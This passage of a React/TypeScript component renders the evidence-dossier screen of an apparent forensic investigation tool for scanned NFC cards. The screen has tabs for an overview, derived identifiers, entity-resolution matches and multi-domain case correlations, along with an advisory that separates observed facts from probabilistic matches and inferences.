              <div className="p-4 bg-muted/40 border border-border rounded-xl flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-xs font-mono font-bold text-primary bg-primary/10 px-2 py-0.5 rounded border border-primary/20">
                      {activeDossier.acquisition_id}
                    </span>
                    <span className="text-xs font-mono text-muted-foreground">
                      Evidence ID: {activeDossier.evidence_id}
                    </span>
                  </div>
                  <h3 className="text-base font-bold text-foreground flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-emerald-500" />
                    Acquired Physical NFC Card Evidence Dossier
                  </h3>
                </div>

                <div className="flex items-center gap-2">
                  <div className="flex items-center gap-1.5 bg-background border border-border px-2.5 py-1.5 rounded-lg text-xs font-mono">
                    <span className="text-muted-foreground">SHA-256:</span>
                    <span className="text-foreground">{activeDossier.raw_sha256.slice(0, 16)}...</span>
                    <button
                      onClick={() => copySha256(activeDossier.raw_sha256)}
                      className="text-muted-foreground hover:text-foreground ml-1"
                      title="Copy full SHA-256 hash"
                    >
                      {copiedHash ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>
              </div>

              {/* FORENSIC ADVISORY BADGE: "Can this be used as proof?" */}
              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-xl space-y-2.5">
                <div className="flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-amber-500" />
                  <h4 className="text-xs font-bold uppercase tracking-wider text-amber-600 dark:text-amber-400">
                    Forensic Admissibility Advisory: Epistemic Separation of Proof
                  </h4>
                </div>
                <p className="text-xs text-amber-900/90 dark:text-amber-200/90 leading-relaxed">
                  In compliance with law-enforcement evidentiary standards, this platform enforces strict demarcation between 
                  <strong className="mx-1 underline">Observed Physical Facts</strong>,
                  <strong className="mx-1 underline">Derived Identifiers</strong>,
                  <strong className="mx-1 underline">Probabilistic Entity Matches</strong>, and
                  <strong className="mx-1 underline">Investigative Inferences</strong>.
                </p>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 pt-1 text-[11px]">
                  <div className="bg-background/80 p-2 rounded border border-amber-500/20">
                    <div className="font-bold text-foreground">1. Observed Fact</div>
                    <div className="text-muted-foreground mt-0.5">Physical card recovered at scene contains verifiable bytes.</div>
                  </div>
                  <div className="bg-background/80 p-2 rounded border border-amber-500/20">
                    <div className="font-bold text-foreground">2. Derived Fact</div>
                    <div className="text-muted-foreground mt-0.5">Normalized phone/email syntactically extracted.</div>
                  </div>
                  <div className="bg-background/80 p-2 rounded border border-amber-500/20">
                    <div className="font-bold text-foreground">3. Entity Match</div>
                    <div className="text-muted-foreground mt-0.5">Probabilistic ER link (confidence: {Math.round(activeDossier.entity_resolution.confidence * 100)}%).</div>
                  </div>
                  <div className="bg-background/80 p-2 rounded border border-amber-500/20">
                    <div className="font-bold text-amber-600 dark:text-amber-400">4. Legal Inference</div>
                    <div className="text-muted-foreground mt-0.5">Presence of card ≠ autonomous proof of card ownership or intent.</div>
                  </div>
                </div>
              </div>

              {/* Dossier Tabs */}
              <div className="flex border-b border-border text-xs overflow-x-auto scrollbar-hide touch-scroll">
                <button
                  onClick={() => setDossierTab('OVERVIEW')}
                  className={cn(
                    "px-4 py-2 font-medium border-b-2 transition-colors whitespace-nowrap",
                    dossierTab === 'OVERVIEW' 
                      ? "border-primary text-primary" 
                      : "border-transparent text-muted-foreground hover:text-foreground"
                  )}
                >
                  Overview & Assessment
                </button>
                <button
                  onClick={() => setDossierTab('IDENTIFIERS')}
                  className={cn(
                    "px-4 py-2 font-medium border-b-2 transition-colors flex items-center gap-1.5 whitespace-nowrap",
                    dossierTab === 'IDENTIFIERS' 
                      ? "border-primary text-primary" 
                      : "border-transparent text-muted-foreground hover:text-foreground"
                  )}
                >
                  Derived Identifiers ({activeDossier.derived_identifiers.length})
                </button>
                <button
                  onClick={() => setDossierTab('ER')}
                  className={cn(
                    "px-4 py-2 font-medium border-b-2 transition-colors flex items-center gap-1.5 whitespace-nowrap",
                    dossierTab === 'ER' 
                      ? "border-primary text-primary" 
                      : "border-transparent text-muted-foreground hover:text-foreground"
                  )}
                >
                  Entity Resolution ({activeDossier.entity_resolution.match_tier})
                </button>
                <button
                  onClick={() => setDossierTab('CORRELATIONS')}
                  className={cn(
                    "px-4 py-2 font-medium border-b-2 transition-colors flex items-center gap-1.5 whitespace-nowrap",
                    dossierTab === 'CORRELATIONS' 
                      ? "border-primary text-primary" 
                      : "border-transparent text-muted-foreground hover:text-foreground"
                  )}
                >
                  Multi-Domain Correlation
                </button>
              </div>

              {/* Sub-Tab 1: Overview & Assessment */}
              {dossierTab === 'OVERVIEW' && (
                <div className="space-y-4">
                  <div className="bg-card border border-border p-4 rounded-xl space-y-2">
                    <h4 className="text-xs font-bold uppercase text-muted-foreground">
                      Investigator Forensic Assessment (Neutral Synthesis)
                    </h4>
                    <p className="text-xs text-foreground leading-relaxed whitespace-pre-line font-mono bg-muted/30 p-3 rounded-lg border border-border/50">
                      {activeDossier.investigator_assessment}
                    </p>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs">
                    <div className="p-3 bg-muted/30 border border-border rounded-xl space-y-1">
                      <span className="text-muted-foreground font-medium">Acquired By</span>
                      <div className="font-bold text-foreground">{activeDossier.acquired_by}</div>
                      <div className="text-[10px] text-muted-foreground">{new Date(activeDossier.acquired_at).toLocaleString()}</div>
                    </div>
                    <div className="p-3 bg-muted/30 border border-border rounded-xl space-y-1">
                      <span className="text-muted-foreground font-medium">Card Serial (UID)</span>
                      <div className="font-mono font-bold text-foreground">{activeDossier.card_uid || 'Unspecified'}</div>
                      <div className="text-[10px] text-muted-foreground">Format: {activeDossier.nfc_format} ({activeDossier.record_count} Records)</div>
                    </div>
                    <div className="p-3 bg-muted/30 border border-border rounded-xl space-y-1">
                      <span className="text-muted-foreground font-medium">Storage Location</span>
                      <div className="font-mono text-[11px] text-foreground truncate">{activeDossier.raw_payload_uri}</div>
                      <div className="text-[10px] text-emerald-500 font-medium">AES-256-GCM Encrypted</div>
                    </div>
                  </div>
                </div>
              )}

              {/* Sub-Tab 2: Derived Identifiers */}
              {dossierTab === 'IDENTIFIERS' && (
                <div className="space-y-3">
                  <div className="border border-border rounded-xl overflow-hidden overflow-x-auto touch-scroll">
                    <table className="w-full text-left text-xs min-w-[580px]">
                      <thead className="bg-muted/60 text-muted-foreground uppercase text-[10px] font-bold border-b border-border">
                        <tr>
                          <th className="px-4 py-2.5">Field</th>
                          <th className="px-4 py-2.5">Extracted Value</th>
                          <th className="px-4 py-2.5">Extraction Method</th>
                          <th className="px-4 py-2.5">Confidence</th>
                          <th className="px-4 py-2.5">Status</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-border">
                        {activeDossier.derived_identifiers.length === 0 ? (
                          <tr>
                            <td colSpan={5} className="px-4 py-6 text-center text-muted-foreground">
                              No structured identifiers could be parsed from raw records.
                            </td>
                          </tr>
                        ) : (
                          activeDossier.derived_identifiers.map((ident, idx) => (
                            <tr key={idx} className="hover:bg-muted/30 transition-colors">
                              <td className="px-4 py-2.5 font-bold uppercase text-[11px] text-primary">
                                {ident.field}
                              </td>
                              <td className="px-4 py-2.5 font-mono text-foreground font-medium">
                                {ident.value}
                              </td>
                              <td className="px-4 py-2.5 text-muted-foreground">
                                {ident.extraction_method}
                              </td>
                              <td className="px-4 py-2.5">
                                <span className="font-mono text-[11px] text-foreground">
                                  {Math.round(ident.confidence * 100)}%
                                </span>
                              </td>
                              <td className="px-4 py-2.5">
                                <span className={cn(
                                  "px-2 py-0.5 rounded text-[10px] font-bold uppercase",
                                  ident.status === 'EXTRACTED' ? "bg-emerald-500/10 text-emerald-500 border border-emerald-500/20" :
                                  "bg-destructive/10 text-destructive border border-destructive/20"
                                )}>
                                  {ident.status}
                                </span>
                              </td>
                            </tr>
                          ))
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* Sub-Tab 3: Entity Resolution */}
              {dossierTab === 'ER' && (
                <div className="space-y-4">
                  {/* Match Tier Card */}
                  <div className={cn(
                    "p-4 rounded-xl border flex flex-col sm:flex-row sm:items-center justify-between gap-4",
                    activeDossier.entity_resolution.match_tier === 'MATCHED' && "bg-emerald-500/10 border-emerald-500/30",
                    activeDossier.entity_resolution.match_tier === 'POSSIBLE_MATCH' && "bg-amber-500/10 border-amber-500/30",
                    activeDossier.entity_resolution.match_tier === 'NO_MATCH' && "bg-blue-500/10 border-blue-500/30"
                  )}>
                    <div>
                      <div className="flex items-center gap-2 mb-1">
                        <span className={cn(
                          "px-2 py-0.5 rounded text-xs font-bold uppercase",
                          activeDossier.entity_resolution.match_tier === 'MATCHED' && "bg-emerald-500 text-white",
                          activeDossier.entity_resolution.match_tier === 'POSSIBLE_MATCH' && "bg-amber-500 text-white",
                          activeDossier.entity_resolution.match_tier === 'NO_MATCH' && "bg-blue-500 text-white"
                        )}>
                          {activeDossier.entity_resolution.match_tier}
                        </span>
                        {activeDossier.entity_resolution.is_provisional && (
                          <span className="text-[11px] font-mono text-muted-foreground bg-muted px-2 py-0.5 rounded border border-border">
                            Provisional Candidate Entity
                          </span>
                        )}
                      </div>
                      <h4 className="text-base font-bold text-foreground">
                        {activeDossier.entity_resolution.matched_name}
                      </h4>
                      <div className="text-xs font-mono text-muted-foreground">
                        Cluster ID: {activeDossier.entity_resolution.matched_cluster_id}
                      </div>
                    </div>

                    <div className="text-right">
                      <div className="text-2xl font-bold font-mono text-foreground">
                        {Math.round(activeDossier.entity_resolution.confidence * 100)}%
                      </div>
                      <div className="text-[10px] text-muted-foreground uppercase font-bold">
                        Resolution Confidence
                      </div>
                    </div>
                  </div>

                  {/* Match Grounds / Reasons */}
                  <div className="bg-card border border-border p-4 rounded-xl space-y-2">
                    <h5 className="text-xs font-bold uppercase text-muted-foreground">
                      Match Grounds & Algorithmic Explainability
                    </h5>
                    <ul className="space-y-1.5 text-xs text-foreground">
                      {activeDossier.entity_resolution.reasons.map((reason, idx) => (
                        <li key={idx} className="flex items-start gap-2">
                          <Check className="w-3.5 h-3.5 text-emerald-500 flex-shrink-0 mt-0.5" />
                          <span>{reason}</span>
                        </li>
                      ))}
                    </ul>

                    {/* Discrepancies if any */}
                    {activeDossier.entity_resolution.conflicts && activeDossier.entity_resolution.conflicts.length > 0 && (
                      <div className="mt-3 pt-3 border-t border-border/50">
                        <div className="text-[11px] font-bold text-amber-500 uppercase mb-1">
                          Observed Attribute Conflicts (Golden Profile Protected)
                        </div>
                        <ul className="space-y-1 text-xs text-amber-600 dark:text-amber-400">
                          {activeDossier.entity_resolution.conflicts.map((conflict, idx) => (
                            <li key={idx} className="flex items-start gap-2">
                              <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                              <span>{conflict}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                    )}
                  </div>

                  {/* Alternative Candidates */}
                  {activeDossier.entity_resolution.candidates && activeDossier.entity_resolution.candidates.length > 1 && (
                    <div className="border border-border rounded-xl p-4 space-y-2">
                      <h5 className="text-xs font-bold uppercase text-muted-foreground">
                        Alternative Case Profile Candidates ({activeDossier.entity_resolution.candidates.length})
                      </h5>
                      <div className="divide-y divide-border text-xs">
                        {activeDossier.entity_resolution.candidates.map(c => (
                          <div key={c.cluster_id} className="py-2 flex items-center justify-between">
                            <div>
                              <div className="font-bold text-foreground">{c.primary_name}</div>
                              <div className="text-[10px] font-mono text-muted-foreground">{c.cluster_id}</div>
                            </div>
                            <div className="font-mono text-xs font-medium">
                              Score: {Math.round(c.score * 100)}%
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* Sub-Tab 4: Multi-Domain Case Correlation */}
              {dossierTab === 'CORRELATIONS' && (
                <div className="space-y-4">
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4">
                    {/* Telecom CDR */}
                    <div className="p-4 bg-card border border-border rounded-xl space-y-1.5">
                      <div className="flex items-center gap-2 text-indigo-500">
                        <Smartphone className="w-4 h-4" />
                        <span className="text-xs font-bold uppercase">Telecom CDR</span>
                      </div>
                      <div className="text-lg font-bold font-mono text-foreground">
                        {activeDossier.case_correlations.telecom_cdr.count} Events
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        {activeDossier.case_correlations.telecom_cdr.summary}
                      </p>
                    </div>

                    {/* Financial Banking */}
                    <div className="p-4 bg-card border border-border rounded-xl space-y-1.5">
                      <div className="flex items-center gap-2 text-emerald-500">
                        <CreditCard className="w-4 h-4" />
                        <span className="text-xs font-bold uppercase">Financial / Banking</span>
                      </div>
                      <div className="text-lg font-bold font-mono text-foreground">
                        {activeDossier.case_correlations.financial_banking.count} Transactions
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        {activeDossier.case_correlations.financial_banking.summary}
                      </p>
                    </div>

                    {/* Network IPDR */}
                    <div className="p-4 bg-card border border-border rounded-xl space-y-1.5">
                      <div className="flex items-center gap-2 text-blue-500">
                        <Globe className="w-4 h-4" />
                        <span className="text-xs font-bold uppercase">Network IPDR</span>
                      </div>
                      <div className="text-lg font-bold font-mono text-foreground">
                        {activeDossier.case_correlations.network_ipdr.count} Sessions
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        {activeDossier.case_correlations.network_ipdr.summary}
                      </p>
                    </div>

                    {/* Chronological Timeline */}
                    <div className="p-4 bg-card border border-border rounded-xl space-y-1.5">
                      <div className="flex items-center gap-2 text-amber-500">
                        <Clock className="w-4 h-4" />
                        <span className="text-xs font-bold uppercase">Timeline Footprint</span>
                      </div>
                      <div className="text-lg font-bold font-mono text-foreground">
                        {activeDossier.case_correlations.timeline_events.count} Events
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        {activeDossier.case_correlations.timeline_events.summary}
                      </p>
                    </div>

                    {/* Geospatial Proximity */}
                    <div className="p-4 bg-card border border-border rounded-xl space-y-1.5">
                      <div className="flex items-center gap-2 text-cyan-500">
                        <MapPin className="w-4 h-4" />
                        <span className="text-xs font-bold uppercase">Geospatial Proximity</span>
                      </div>
                      <div className="text-lg font-bold font-mono text-foreground">
                        {activeDossier.case_correlations.geospatial_proximity.proximity_detected ? 'Overlap Detected' : 'No Direct Overlap'}
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        {activeDossier.case_correlations.geospatial_proximity.summary}
                      </p>
                    </div>

                    {/* Anomaly Signals */}
                    <div className="p-4 bg-card border border-border rounded-xl space-y-1.5">
                      <div className="flex items-center gap-2 text-pink-500">
                        <AlertTriangle className="w-4 h-4" />
                        <span className="text-xs font-bold uppercase">Detection Signals</span>
                      </div>
                      <div className="text-lg font-bold font-mono text-foreground">
                        {activeDossier.case_correlations.anomaly_signals.count} Correlated
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        Signals referencing candidate entity identifiers.
                      </p>
                    </div>
                  </div>

                  {/* Synthesized Finding if present */}
                  {activeDossier.finding_id && (
                    <div className="p-4 bg-gradient-to-r from-amber-500/10 to-orange-500/10 border border-amber-500/30 rounded-xl flex items-center justify-between">
                      <div>
                        <div className="text-xs font-bold uppercase text-amber-600 dark:text-amber-400">
                          Synthesized Investigative Finding ({activeDossier.finding_id})
                        </div>
                        <p className="text-xs text-foreground mt-0.5">
                          Multi-domain corroboration threshold met across independent evidence domains.
                        </p>
                      </div>
                      {onNavigateToFindings && (
                        <button
                          onClick={() => {
                            onClose();
                            onNavigateToFindings(activeDossier.finding_id);
                          }}
                          className="px-3 py-1.5 bg-amber-500 text-white text-xs font-medium rounded-lg hover:bg-amber-600 transition-colors flex items-center gap-1 shadow-sm"
                        >
                          View Finding <ArrowRight className="w-3.5 h-3.5" />
                        </button>
                      )}
                    </div>
                  )}
                </div>
              )}

              {/* Action Navigation Bar */}
              <div className="flex flex-wrap items-center justify-between gap-3 pt-4 border-t border-border">
                <div className="flex flex-wrap items-center gap-2">
                  {onNavigateToGraph && (
                    <button
                      onClick={() => {
                        onClose();
                        onNavigateToGraph(activeDossier.entity_resolution.matched_cluster_id);
                      }}
                      className="px-3 py-2 bg-secondary text-foreground border border-border text-xs font-medium rounded-lg hover:bg-secondary/80 transition-colors flex items-center gap-1.5"
                    >
                      <Share2 className="w-3.5 h-3.5 text-primary" />
                      View in Graph
                    </button>
                  )}
                  {onNavigateToTimeline && (
                    <button
                      onClick={() => {
                        onClose();
                        onNavigateToTimeline();
                      }}
                      className="px-3 py-2 bg-secondary text-foreground border border-border text-xs font-medium rounded-lg hover:bg-secondary/80 transition-colors flex items-center gap-1.5"
                    >
                      <Clock className="w-3.5 h-3.5 text-amber-500" />
                      View on Timeline
                    </button>
                  )}
                  {onNavigateToMap && (
                    <button
                      onClick={() => {
                        onClose();
                        onNavigateToMap();
                      }}
                      className="px-3 py-2 bg-secondary text-foreground border border-border text-xs font-medium rounded-lg hover:bg-secondary/80 transition-colors flex items-center gap-1.5"
                    >
                      <MapPin className="w-3.5 h-3.5 text-emerald-500" />
                      View on Map
                    </button>
                  )}
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      setScannerState('WAITING_FOR_CARD');
                      setModalTab('SCANNER');
                      if (isWebNfcSupported) startWebNfcScan();
                    }}
                    className="px-3 py-2 bg-muted text-foreground text-xs font-medium rounded-lg hover:bg-muted/80 transition-colors flex items-center gap-1.5"
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                    Scan Another Card
                  </button>
                  <button
                    onClick={onClose}
                    className="px-4 py-2 bg-primary text-primary-foreground text-xs font-medium rounded-lg hover:bg-primary/90 transition-colors"
                  >
                    Done
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function CrosshairIcon(props: React.SVGProps<SVGSVGElement>) {
  return (
    <svg
      {...props}
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
      viewBox="0 0 24 24"
    >
      <circle cx="12" cy="12" r="10" />
      <line x1="22" y1="12" x2="18" y2="12" />
      <line x1="6" y1="12" x2="2" y2="12" />
      <line x1="12" y1="6" x2="12" y2="2" />
      <line x1="12" y1="22" x2="12" y2="18" />
    </svg>
  );
}
